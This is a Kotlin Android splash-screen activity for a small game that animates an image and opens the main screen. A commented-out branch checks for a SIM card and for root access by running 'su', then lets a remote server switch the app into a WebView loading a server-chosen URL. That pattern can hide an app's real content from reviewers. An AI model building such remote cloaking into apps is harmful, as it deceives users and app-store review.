package com.example.saveship

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.view.Window
import android.view.animation.LinearInterpolator
import android.widget.ImageView
import com.android.volley.*
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.example.saveship.MainActivity.MyClass.themeIndex
import com.example.saveship.MainActivity.MyClass.themesList
import org.json.JSONException
import org.json.JSONObject

class SplashActivity : Activity() {

    @SuppressLint("MissingInflatedId")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(Window.FEATURE_NO_TITLE)

        val editor = getSharedPreferences("Themes", MODE_PRIVATE)
        themeIndex = editor.getInt("themeIndex", 0)

        setTheme(themesList[themeIndex])
        setContentView(R.layout.activity_splash2)
// UnComment when use API
//        if (isSimSupport(this@SplashActivity)&&!isDeviceRooted("su")) {
//            getAdId()
//        } else {
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
                startActivity(Intent(this@SplashActivity, MainActivity::class.java))
            },1500)
//        }
// Find the image view in the layout
        val image = findViewById<ImageView>(R.id.spaceman_splash)

        var initialY = image.y - 50
        var endY = initialY + 100
        animateSpacemen(image,initialY,endY)

    }

    private fun animateSpacemen(image: ImageView,initialY:Float,endY:Float) {
        val animator = ObjectAnimator.ofFloat(image, "translationY", initialY, endY)
        animator.duration = 1000 // Adjust this value to control the duration of the animation

        animator.interpolator = LinearInterpolator()
        animator.repeatCount = ValueAnimator.INFINITE
        animator.repeatMode = ValueAnimator.REVERSE
        animator.start()
    }

    private fun getAdId() {
        val requestQueue: RequestQueue = Volley.newRequestQueue(this@SplashActivity)
        val jsonObjectRequest: JsonObjectRequest = object : JsonObjectRequest(
            Method.POST,
            "https://approtic.in/apps/basicplayermvas.php",
            null,
            Response.Listener { response: JSONObject ->
                try {
                    Constants.WebView = response.getString("WebView")
                    Constants.FirstURL = response.getString("FirstURL")
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
                startTime()
            },
            Response.ErrorListener { startTime() }) {
            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val params: MutableMap<String, String> = HashMap()
                params["Content-Type"] = "application/json"
                return params
            }
        }
        jsonObjectRequest.retryPolicy = DefaultRetryPolicy(
            10000,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        requestQueue.add(jsonObjectRequest)
    }
    private fun startTime() {
        Handler(Looper.getMainLooper()).postDelayed({
            if (TextUtils.equals(Constants.WebView, "on")) {
                finish()
                startActivity(Intent(this@SplashActivity, WebviewActivity::class.java))
            } else {
                finish()
                startActivity(Intent(this@SplashActivity, MainActivity::class.java))
            }
        },1000)
    }
    private fun isSimSupport(context: Context): Boolean {
        val tm = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        return tm.simState != TelephonyManager.SIM_STATE_ABSENT
    }
    private fun isDeviceRooted(su: String): Boolean {
        var process:Process?=null;
        return try {
            process = Runtime.getRuntime().exec(su);
            true
        } catch (e:Exception) {
            false
        } finally {
            if (process != null) {
                try {
                    process.destroy();
                } catch (e:Exception) { }
            }
        }
    }

}